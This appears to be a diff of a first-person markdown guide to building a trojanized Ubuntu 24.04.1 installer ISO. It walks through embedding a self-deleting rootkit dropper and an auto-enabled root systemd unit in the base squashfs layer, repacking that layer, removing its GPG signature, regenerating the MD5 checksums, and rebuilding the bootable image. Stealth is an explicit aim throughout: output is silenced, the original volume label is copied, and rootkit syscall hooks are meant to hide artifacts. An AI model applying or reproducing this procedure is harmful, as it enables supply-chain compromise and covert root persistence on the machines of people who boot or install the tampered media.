@@ -1,8 +1,8 @@
-# Kernel Implant on Ubuntu 24.04.1: Live Filesystem Layer Injection of a Self-Cleaning Rootkit Dropper for Root Execution on Live and Installed Systems
+# Kernel Implant on Linux Operating Systems (Installer ISO): Filesystem Layer Injection of a Self-Cleaning Rootkit Dropper for Root Execution on Live and Installed Systems
 
 ## Overview
 
-I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled ELF rootkit dropper (`implant`) and a native systemd unit directly into the live filesystem's **base layer** (`casper/minimal.squashfs`). Because this base layer is the one Casper overlays at boot for the Live session **and** the one the installer writes to the target disk, the dropper executes automatically as root on every boot of the modified media—whether the user picks "Try Ubuntu" or completes an install. Once the rootkit confirms successful installation, the dropper deletes itself from disk, leaving no first-stage artifact behind.
+I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled ELF rootkit dropper (`implant`) and a native systemd unit directly into the live filesystem's **base layer** (`casper/minimal.squashfs`). Because this base layer is the one Casper overlays at boot for the Live session **and** the one the installer writes to the target disk under the default install source, the dropper executes automatically as root on every boot of the modified media whether the user picks "Try Ubuntu" or completes an install. Once the rootkit confirms successful installation, the dropper deletes itself from disk, leaving no first-stage artifact behind.
 
 The method itself is not Ubuntu-specific. Ubuntu's live media is built on Casper, which overlays a set of SquashFS images as `/` and runs systemd units from `/etc/systemd/system/`. Any Casper-based Ubuntu-derived ISO that uses the same layered squashfs scheme and systemd structure can be treated the same way. I targeted Ubuntu 24.04.1 Desktop because that was the system I had in front of me, and the guide below is written against that target.
 
@@ -80,6 +80,10 @@ cd ~/Kernel_Implant
 mv /path/to/ubuntu-24.04.1-desktop-amd64.iso .
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/49fe49f5-f332-4081-8fac-24f46cb8c369) |
+
 I verified the directory contents:
 
 ```bash
@@ -89,10 +93,14 @@ ls -al
 Expected output:
 
 ```
-drwxrwxr-x 2 localhost localhost       4096 Oct 15 20:35 .
-drwxrwxr-x 4 localhost localhost       4096 Oct 15 20:34 ..
--rw-rw-r-- 1 localhost localhost 6203355136 Oct 15 20:35 ubuntu-24.04.1-desktop-amd64.iso
+drwxrwxr-x    2 localhost localhost       4096 Oct 20 03:58 .
+drwx--x---+ 142 localhost localhost      12288 Oct 20 03:59 ..
+-rw-r--r--    1 root      root      6203355136 Oct 20 03:58 ubuntu-24.04.1-desktop-amd64.iso
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/89919654-0022-43d1-9f39-d2379d35651e) |
 
 I also placed my compiled ELF rootkit dropper in the same directory and named it `implant`.
 
@@ -143,7 +151,11 @@ The output reported the exact `xorriso -as mkisofs` arguments that reproduce the
 -no-emul-boot
 ```
 
-**Key differences from older Ubuntu releases**: Ubuntu 24.04 no longer uses ISOLINUX for legacy BIOS boot. The boot image is now `/boot/grub/i386-pc/eltorito.img`, and the EFI boot image is not a file in the ISO filesystem—it is an **appended EFI partition**. The `-report_el_torito as_mkisofs` output reflects this.
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/789de499-edbd-4245-beba-7036e3744845) |
+
+**Key differences from older Ubuntu releases**: Ubuntu 24.04 no longer uses ISOLINUX for legacy BIOS boot. The boot image is now `/boot/grub/i386-pc/eltorito.img`, and the EFI boot image is not a file in the ISO filesystem, it is an **appended EFI partition**. The `-report_el_torito as_mkisofs` output reflects this.
 
 I then mounted the ISO and extracted its contents:
 
@@ -154,6 +166,10 @@ sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso isomount
 rsync -a isomount/ extracted
 sudo umount isomount
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/16671e74-b814-4d38-99f5-527df376c167) |
 
 Using rsync preserves file permissions and symbolic links, which is critical for a bootable ISO.
 
@@ -166,17 +182,21 @@ ls extracted
 ls -lh extracted/casper/
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/ea67a131-d61c-4d9c-b1f3-cbea8a1d72ed) |
+
 The `casper/` directory did **not** contain a single `filesystem.squashfs` file. It contained many squashfs images, one per install variant and per language. The relevant ones were:
 
 ```
 filesystem.manifest
 filesystem.size
-initrd                           (75 MB — Casper boot initramfs, NOT the installer's)
+initrd                           (75 MB, Casper boot initramfs, NOT the installer's)
 install-sources.yaml
-minimal.squashfs                 (1.75 GB — minimal base)
-minimal.standard.live.squashfs   (917 MB — standard desktop live layer)
-minimal.standard.squashfs        (494 MB — standard layer, no live bits)
-minimal.<lang>.squashfs          (16 MB each — per-language minimal variants)
+minimal.squashfs                 (1.75 GB, minimal base)
+minimal.standard.live.squashfs   (917 MB, standard desktop live layer)
+minimal.standard.squashfs        (494 MB, standard layer, no live bits)
+minimal.<lang>.squashfs          (16 MB each, per-language minimal variants)
 minimal.enhanced-secureboot*.squashfs
 ...
 vmlinuz
@@ -184,25 +204,72 @@ vmlinuz
 
 **This is the most important layout detail I had to get right, and it was also where my first attempt failed.** Ubuntu 24.04.1 Desktop does not ship a single `filesystem.squashfs` at the top of `casper/`. Instead it uses a layered squashfs scheme:
 
-- **`minimal.squashfs`** (1.75 GB) — the minimal base Ubuntu root filesystem. This is the layer that gets written to disk during installation **and** the layer Casper overlays for the Live session.
-- **`minimal.standard.live.squashfs`** (917 MB) — the "standard" desktop layer on top of the minimal base, used by the Live session.
-- **`minimal.standard.squashfs`** (494 MB) — the standard layer without the Live-specific bits.
-- **`minimal.standard.<lang>.squashfs`** — per-language variants.
-- **`minimal.enhanced-secureboot*.squashfs`** — secureboot variants.
-- **`minimal.<lang>.squashfs`** — minimal base per-language variants.
+- **`minimal.squashfs`** (1.75 GB): the minimal base Ubuntu root filesystem. This is the layer the default installer writes to disk and the base Casper overlays for the Live session.
+- **`minimal.standard.live.squashfs`** (917 MB): the "standard" desktop layer on top of the minimal base, used by the Live session.
+- **`minimal.standard.squashfs`** (494 MB): the standard layer without the Live-specific bits.
+- **`minimal.standard.<lang>.squashfs`**: per-language variants.
+- **`minimal.enhanced-secureboot*.squashfs`**: secureboot variants.
+- **`minimal.<lang>.squashfs`**: minimal base per-language variants.
 
-Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected). The `boot/grub/grub.cfg` on the ISO selects the Live leaf layer with `layerfs-path=minimal.standard.live.squashfs`.
+Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected).
 
-**The installation path is different.** The installer writes the **base layer** (`minimal.squashfs`) to the target disk. It does not write the Live-session leaf layer. That is why my first attempt—placing the dropper in `minimal.standard.live.squashfs`—showed the dropper in the Live session but not on the installed system. The layer that gets installed is `minimal.squashfs`.
-
-I confirmed the boot leaf layer by inspecting the grub config:
+**How the layer stack is selected**: I checked the grub config on the ISO:
 
 ```bash
-grep -r "layerfs-path" extracted/boot/grub/grub.cfg
-# saw layerfs-path=minimal.standard.live.squashfs
+cat extracted/boot/grub/grub.cfg
 ```
 
-That confirms the Live session uses the `.live.squashfs` leaf layer. The installer, however, builds the target from the base layer. **Targeting the base layer means the dropper is present in both the Live session and the installed system**: the Live session overlays the base plus the leaf, so the base's `/usr/bin/implant` is visible there, and the installer writes the same base to disk, so the installed system has it too. That is the correct target for a dropper that needs to run in both contexts.
+It contained no `layerfs-path` line. The menu entries are just:
+
+```
+menuentry "Try or Install Ubuntu" {
+        set gfxpayload=keep
+        linux   /casper/vmlinuz  --- quiet splash
+        initrd  /casper/initrd
+}
+menuentry "Ubuntu (safe graphics)" {
+        set gfxpayload=keep
+        linux   /casper/vmlinuz nomodeset  --- quiet splash
+        initrd  /casper/initrd
+}
+```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/52b79c3b-1917-4561-8866-886c8681613a) |
+
+There is no explicit leaf-layer selector in the grub config. Casper reads the contents of `casper/` and `install-sources.yaml` at boot and assembles the overlay stack itself. The grub config only tells it which kernel and which initrd to use.
+
+I then inspected `install-sources.yaml`, which defines the installable sources and maps each one to its squashfs layer:
+
+```bash
+cat extracted/casper/install-sources.yaml
+```
+
+The output was:
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/958d5834-8bd6-4501-95f6-7e167eb5961f) |
+
+**This is the key mapping I had to understand.** There are two installable sources:
+
+1. **`ubuntu-desktop-minimal`** (default: true): a minimal but usable Ubuntu Desktop. Its `path` is `minimal.squashfs`. This is the layer the installer writes to disk when the user selects the default (minimized) desktop install.
+2. **`ubuntu-desktop`** (default: false): a full featured Ubuntu Desktop. Its `path` is `minimal.standard.squashfs`. This is the layer written when the user selects the full desktop install.
+
+Both sources are `type: fsimage-layered`, which means each is a base layer plus additional layers stacked on top. The `path` field points at the **base** of the stack for that source. The `variations` map lists alternative bases for that source (for example, the enhanced-secureboot variants). The Live session overlays the base plus the desktop additions; the installer writes the base to the target disk.
+
+**What this means for targeting the dropper:**
+
+- The default install (`ubuntu-desktop-minimal`) writes `minimal.squashfs` to disk. That is the layer I want the dropper in.
+- The full desktop install (`ubuntu-desktop`) writes `minimal.standard.squashfs` to disk. That is a different layer.
+- The Live session overlays the base plus the standard layer, so the base is visible in both.
+
+My first attempt put the dropper in `minimal.standard.live.squashfs`, which is the Live-session leaf layer. That is not the base of either install source, so it did not reach the installed disk. The correct target is the base of the source the user installs. For the default source, that is `minimal.squashfs`.
+
+**Targeting `minimal.squashfs` means the dropper is present in both the Live session and the default installed system**: the Live session overlays the base plus the standard layers, so the base's `/usr/bin/implant` is visible there, and the installer writes the same base to disk when the user selects the default source, so the installed system has it too. That is the correct target for a dropper that needs to run in both contexts under the default install path.
+
+If I wanted to cover the full-desktop source as well, I would repeat the same procedure against `minimal.standard.squashfs`, which is the base of the `ubuntu-desktop` source. That is a separate layer and a separate injection. For this write-up I targeted the default source, `minimal.squashfs`, because it is the layer the default installer writes and the layer the Live session overlays.
 
 `casper/initrd` is the Casper boot initramfs. It is not a Debian-installer initrd and does not contain `finish-install.d/`.
 
@@ -217,6 +284,10 @@ cd ~/Kernel_Implant
 sudo unsquashfs -d squashfs-root extracted/casper/minimal.squashfs
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/b016b57f-3ae6-4f9d-bcac-fceac9b1424b) |
+
 This created a `squashfs-root/` directory. I listed the top level:
 
 ```bash
@@ -224,17 +295,25 @@ ls squashfs-root
 # saw: bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/6881938d-d02a-4afb-87c8-a910591a2351) |
+
 **Unlike the Live leaf layer**, the base layer contains the full root filesystem skeleton: `bin`, `lib`, `sbin`, `opt`, `home`, `media`, `mnt`, `proc`, `sys`, `tmp`, and the rest. That includes `usr/bin/` and `usr/local/bin/`, both of which exist in this layer. This is the layer that gets installed to disk and that Casper overlays for the Live session, so placing the dropper here puts it on **both** the installed system and the Live session.
 
 I confirmed `usr/bin/` exists in the base layer:
 
 ```bash
 ls squashfs-root/usr
-# saw: bin  lib  lib32  lib64  libexec  local  sbin  share  src
+# saw: bin  games  include  lib  lib64  libexec  local  sbin  share  src
 
 ls squashfs-root/usr/bin | head
-# saw real binaries — usr/bin exists in this layer
+# saw real binaries, usr/bin exists in this layer
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/f67b2dc4-718f-40b9-8773-7e21f5a3135e) |
 
 I placed the dropper in `usr/bin/`. It is the conventional location for system binaries on Ubuntu, it already exists in the base layer, and it is less remarkable than a custom directory. `/usr/local/bin/` also exists in the base layer and is a valid alternative; either works. I chose `usr/bin/` for consistency with the rest of the system and because the base layer already ships real binaries there.
 
@@ -254,6 +333,10 @@ sudo chmod 755 squashfs-root/usr/bin/implant
 sudo chown root:root squashfs-root/usr/bin/implant
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/e37a46de-da33-4321-b0c6-1d6cfff6eb6b) |
+
 **Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.
 
 I verified the dropper was a valid ELF:
@@ -269,20 +352,15 @@ If the dropper is statically linked, it will run on any system. If it is dynamic
 ldd ~/Kernel_Implant/implant
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/4d100411-1c8f-4eb8-be4e-a8a55272248f) |
+
 Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the dropper will fail to run.
-
-**For kernel implants requiring module loading**: If the dropper needs to load a kernel module (.ko file), copy it to the appropriate location:
-
-```bash
-sudo mkdir -p squashfs-root/lib/modules/$(uname -r)/kernel/drivers
-sudo cp ~/implant.ko squashfs-root/lib/modules/$(uname -r)/kernel/drivers/implant.ko
-```
-
-Note: The kernel version inside the ISO may differ from the host. Ubuntu 24.04.1 ships the 6.8 kernel series. I checked the target kernel version by examining `squashfs-root/lib/modules/`.
 
 ### 3.2 Create the systemd Unit
 
-I created the unit file directly in the extracted base layer. This is the only auto-run mechanism—a first-class systemd service, no shell wrapper, no compatibility path.
+I created the unit file directly in the extracted base layer. This is the only auto-run mechanism, a first-class systemd service, no shell wrapper, no compatibility path.
 
 ```bash
 sudo nano squashfs-root/etc/systemd/system/implant.service
@@ -306,6 +384,10 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/2269952e-afb5-4c75-be5b-73660c012cf0) |
 
 **Explanation of key lines:**
 
@@ -343,6 +425,10 @@ ls -la squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
 # Should show: lrwxrwxrwx ... -> /etc/systemd/system/implant.service
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/4d87d659-6c07-453d-b79f-1b4e0b4695ae) |
+
 **Why the symlink and not `systemctl enable`**: The extracted layer is not a running system. `systemctl enable` operates on the running host's systemd, not on the extracted tree. The symlink is exactly what `systemctl enable` would create, and it is the same mechanism every package uses when it ships an enabled unit. Creating it manually is the correct approach for an offline filesystem edit.
 
 **Note on `Alias=`**: I did not use an `Alias=` directive. `Alias=` creates an additional name for the unit but does not enable it. The `.wants` symlink is what actually enables the unit at boot. The `[Install]` section's `WantedBy=` directive is what `systemctl enable` reads to decide where to put the symlink; since I am creating the symlink manually, the `WantedBy=` line is documentation rather than mechanism. I kept it for clarity and for anyone who later runs `systemctl enable` on the target.
@@ -353,7 +439,7 @@ On boot, systemd reads the `multi-user.target.wants/` directory and starts every
 
 **Live session**: Casper overlays `minimal.squashfs` (base) plus `minimal.standard.live.squashfs` (leaf) plus the language layer. The dropper and unit are in the base, so they are visible in the merged root. Systemd starts `implant.service` from the merged `/etc/systemd/system/multi-user.target.wants/`. The dropper runs, installs the rootkit, and self-cleans. The rootkit takes over. Because the Live session's root is an overlay backed by the ISO, the self-clean removes the artifacts from the ephemeral overlay, not from the ISO. The media remains unchanged.
 
-**Installed system**: The installer writes the base layer to disk. The dropper and unit are in that layer, so they are present on the installed disk. On first boot, systemd starts `implant.service`, the dropper runs, installs the rootkit, and self-cleans. The artifacts are removed from the installed disk. Only the rootkit remains.
+**Installed system**: The installer writes the base layer to disk under the default source `ubuntu-desktop-minimal`. The dropper and unit are in that layer, so they are present on the installed disk. On first boot, systemd starts `implant.service`, the dropper runs, installs the rootkit, and self-cleans. The artifacts are removed from the installed disk. Only the rootkit remains.
 
 **The same artifact set covers both contexts**, because the base layer is the one both paths use.
 
@@ -364,6 +450,7 @@ On boot, systemd reads the `multi-user.target.wants/` directory and starts every
 - **Logging**: `StandardOutput=null` and `StandardError=null` suppress journal output. To capture logs for debugging, change to `journal` or `file:/var/log/implant.log`. For a production deployment, suppressing is the stealth choice.
 - **Module signing**: If the rootkit loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.
 - **Live session immutability**: In the Live session, the dropper's self-clean removes artifacts from the in-memory overlay. The ISO media is unchanged. If the user installs after the dropper has already run in the Live session, the installer writes the original base layer from the ISO, not the modified in-memory overlay, so the dropper is present again on the installed disk. That is the desired behavior.
+- **Install source selection**: The default install source is `ubuntu-desktop-minimal`, which uses `minimal.squashfs`. If the user selects the full desktop source `ubuntu-desktop` instead, the installer writes `minimal.standard.squashfs`, which does not contain my dropper. For the default source, the dropper reaches the disk. For the full source, it does not, unless I also inject into `minimal.standard.squashfs`.
 
 ---
 
@@ -406,6 +493,10 @@ sudo mksquashfs squashfs-root extracted/casper/minimal.squashfs \
     -progress
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/7d62ebf4-0b39-413c-828e-a96ad3b9eed5) |
+
 The `-comp xz` flag uses XZ compression for a smaller layer size. The process may take several minutes depending on the system. The original base layer is zstd-compressed; xz is still valid and produces a smaller layer at the cost of slower decompression at boot. The base layer is large (1.75 GB uncompressed), so the repack takes longer than the Live leaf layer would have.
 
 ### Update the Layer Size
@@ -415,6 +506,10 @@ The `.size` file records the uncompressed size of the layer and is used by the i
 ```bash
 sudo du -sx --block-size=1 extracted/casper/minimal.squashfs | cut -f1 | sudo tee extracted/casper/minimal.size
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/3272137e-dcf8-4e7f-99f2-e7cf51b96c90) |
 
 **Important for the layered layout**: I updated only the `.size` file that corresponds to the base layer I modified. The other layers (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`, etc.) are untouched and their `.size` files remain valid. If I had modified the Live leaf layer instead, I would update `minimal.standard.live.size`.
 
@@ -431,7 +526,7 @@ I removed the signature for the modified base layer:
 sudo rm extracted/casper/minimal.squashfs.gpg
 ```
 
-**Stealth consideration**: Removing the `.gpg` file is visible to anyone diffing the ISO against a known-good build, but a modified layer with a stale signature is also visible, and more obviously wrong. Removing it is the lesser evil. If I wanted to preserve the appearance of the original ISO more closely, I could leave the stale `.gpg` in place and let the installer's check fail — but that produces a failed-integrity-check dialog on boot, which is louder than a missing signature. Removing it is the quieter choice in practice.
+**Stealth consideration**: Removing the `.gpg` file is visible to anyone diffing the ISO against a known-good build, but a modified layer with a stale signature is also visible, and more obviously wrong. Removing it is the lesser evil. If I wanted to preserve the appearance of the original ISO more closely, I could leave the stale `.gpg` in place and let the installer's check fail, but that produces a failed-integrity-check dialog on boot, which is louder than a missing signature. Removing it is the quieter choice in practice.
 
 ### Update MD5 Checksums
 
@@ -443,6 +538,10 @@ sudo rm md5sum.txt
 sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
 cd ..
 ```
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/b09496b6-23df-4145-b69a-cd5b19b85029) |
 
 **Stealth consideration**: If I wanted to avoid detection of a modified ISO, I could skip regenerating `md5sum.txt`. However, that would cause integrity check warnings on boot and may trigger security tooling. Regenerating it is the quieter choice, since the checksums will match the modified content and the boot-time check will pass.
 
@@ -482,6 +581,10 @@ sudo xorriso -as mkisofs \
     extracted/
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/71727081-24e7-47ff-8d39-c7b141dfeb1d) |
+
 **Notes on the arguments:**
 
 - **`--grub2-mbr --interval:...:$ORIG_ISO`**: the GRUB2 MBR boot code is taken from the first 16 sectors of the original ISO file. I kept the original ISO path correct and did not point it at the new tree.
@@ -490,7 +593,7 @@ sudo xorriso -as mkisofs \
 - **`-isohybrid-gpt-basdat`** was replaced with `-appended_part_as_gpt` on 24.04, because the EFI image is an appended partition rather than an embedded file. The `-report_el_torito as_mkisofs` output is authoritative here; do not hand-edit these flags.
 - **The volume label is copied from the original ISO**, making the modified image blend in with legitimate Ubuntu media. This is a deliberate stealth choice.
 
-**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the dropper does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance—it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.
+**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the dropper does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance, it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.
 
 The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output.
 
@@ -505,11 +608,15 @@ xorriso -indev ~/Kernel_Implant/custom-ubuntu-implant.iso -report_el_torito as_m
 diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
 ```
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/02b4506a-92ee-4708-860c-7d6608240aba) |
+
 The diff should show only the ISO filename changing in the `--interval` paths and possibly the appended-partition start sector (because the filesystem grew). The boot-relevant lines must be identical:
 
 ```
 --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'...'
--append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'...'
+--append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'...'
 -c '/boot.catalog'
 -b '/boot/grub/i386-pc/eltorito.img'
 --grub2-boot-info
@@ -540,6 +647,18 @@ I checked that:
 
 Because `StandardOutput=null` and `StandardError=null` are set, `journalctl -u implant.service` will show the unit start and stop but no process output. That is expected. If I need to debug, I temporarily change those to `journal` in the extracted unit file, repack, and rebuild.
 
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/812c7395-811d-4020-a9cf-e87e149810b0) |
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/2211347d-bdc3-4040-9b3c-db5b18958623) |
+
+| Screenshot |
+|-------|
+| ![screenshot](https://github.com/user-attachments/assets/ed05e092-1f0b-48d2-9b56-09f4826c806d) |
+
 ### Testing with a Virtual Disk (to Test Installation)
 
 To test the full install flow, I added a virtual disk:
@@ -556,7 +675,7 @@ With KVM enabled, the VM runs at near-native speed.
 
 ### Verifying the Installed System
 
-The critical test is not the Live session—it is the installed system. After installation completes and the machine reboots from disk, I checked the target disk from outside:
+The critical test is not the Live session, it is the installed system. After installation completes and the machine reboots from disk, I checked the target disk from outside:
 
 ```bash
 # After install, boot the VM from the installed disk, or mount the disk read-only from the host
@@ -576,11 +695,11 @@ ls -la /usr/bin/implant
 systemctl status implant.service
 ```
 
-If the dropper self-cleaned successfully, the file is gone and the unit is not found. If the rootkit loaded but the self-clean did not run, the file is still present and the unit reports success—that tells me the rootkit's confirmation signal did not fire.
+If the dropper self-cleaned successfully, the file is gone and the unit is not found. If the rootkit loaded but the self-clean did not run, the file is still present and the unit reports success, which tells me the rootkit's confirmation signal did not fire.
 
 ### What to expect once the dropper runs
 
-Because the dropper is baked into the base layer, it runs on every boot of the modified media—Live session or installed system. Because the payload is a self-cleaning dropper, the timeline is different from a plain implant: the dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.
+Because the dropper is baked into the base layer, it runs on every boot of the modified media, Live session or installed system. Because the payload is a self-cleaning dropper, the timeline is different from a plain implant: the dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.
 
 **In the Live session**: the self-clean removes the artifacts from the ephemeral overlay. The ISO media is unchanged. Rebooting the same media re-deploys the dropper, because Casper re-overlays the base layer from the ISO. The self-clean matters for the session, not for the media.
 
@@ -607,7 +726,9 @@ If the self-clean does not run because the rootkit did not confirm success, the 
 
 **If the live system failed to start**, the repacked base layer may have been malformed. I would have booted the ISO and watched for kernel or squashfs errors. I would have extracted my repacked `minimal.squashfs` on the host and confirmed `usr/bin/implant` and `etc/systemd/system/implant.service` were present.
 
-**If the Live session shows the dropper but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed is the base layer, not the Live leaf layer.
+**If the Live session shows the dropper but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed under the default source is `minimal.squashfs`, not the Live leaf layer.
+
+**If the user selected the full desktop source and the dropper was not present after install**, the installer wrote `minimal.standard.squashfs`, which I did not modify. The fix is to repeat the same procedure against `minimal.standard.squashfs` as well. The default source, `ubuntu-desktop-minimal`, uses `minimal.squashfs`; the full source, `ubuntu-desktop`, uses `minimal.standard.squashfs`.
 
 **If the ISO booted but the dropper was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:
 
@@ -639,6 +760,7 @@ When embedding a kernel implant into Ubuntu 24.04.1, I kept these additional fac
 | Persistence | The systemd unit runs the dropper on every boot. The dropper installs the rootkit to a persistent location; the rootkit is the persistent component |
 | Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the rootkit hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
 | Self-clean gating | The dropper removes itself only on confirmed rootkit success. A failed install leaves the artifacts on disk for debugging |
+| Install source selection | The default source `ubuntu-desktop-minimal` uses `minimal.squashfs`, which I modified. The full source `ubuntu-desktop` uses `minimal.standard.squashfs`, which I did not modify. Covering both requires injecting into both layers |
 
 ---
 
@@ -663,7 +785,7 @@ I kept the extracted tree in case I wanted to iterate on the unit or swap the dr
 | Stage | Command | Purpose |
 |-------|---------|---------|
 | Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
-| Identify Layer | `ls -lh extracted/casper/` | Pick `minimal.squashfs` (the base layer used by both Live and installer) |
+| Identify Layer | `ls -lh extracted/casper/` and `cat extracted/casper/install-sources.yaml` | Pick `minimal.squashfs`, the base layer the default installer writes and Casper overlays for Live |
 | Extract Layer | `unsquashfs -d squashfs-root casper/minimal.squashfs` | Access the base root filesystem layer |
 | Insert Dropper | `cp implant squashfs-root/usr/bin/` | Bundle your dropper |
 | Create Unit | Write `implant.service` | Native systemd auto-run |
@@ -674,21 +796,21 @@ I kept the extracted tree in case I wanted to iterate on the unit or swap the dr
 | Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
 | Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |
 
-That is it. No shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO—in both the Live session and the installed system—started by a native systemd unit indistinguishable in structure from any other service on the system, and self-cleaning once the rootkit confirms installation.
+That is it. No shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO in both the Live session and the default installed system, started by a native systemd unit indistinguishable in structure from any other service on the system, and self-cleaning once the rootkit confirms installation.
 
 ---
 
 ## Conclusion
 
-By injecting a self-cleaning rootkit dropper and a native systemd unit into the live filesystem's base layer under `casper/`, the dropper is deployed into both the Live session and the installed system at boot, executes as root before most security tooling initializes, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that both paths use, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
+By injecting a self-cleaning rootkit dropper and a native systemd unit into the live filesystem's base layer under `casper/`, the dropper is deployed into both the Live session and the default installed system at boot, executes as root before most security tooling initializes, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that both paths use, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.
 
-On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images: a minimal base (`minimal.squashfs`), a standard layer (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`), per-language variants, and secureboot variants. **The base layer is the one both the Live session and the installer use.** Casper overlays the base plus the leaf layer for the Live session, and the installer writes the base layer to the target disk. My first attempt placed the dropper in the Live leaf layer, which put it in the Live session but not on the installed system. Correcting that, I placed the dropper in `minimal.squashfs`, which is the layer that reaches both contexts. The result works in both: the Live session overlays the base and sees the dropper, and the installer writes the base to disk and the installed system sees it too.
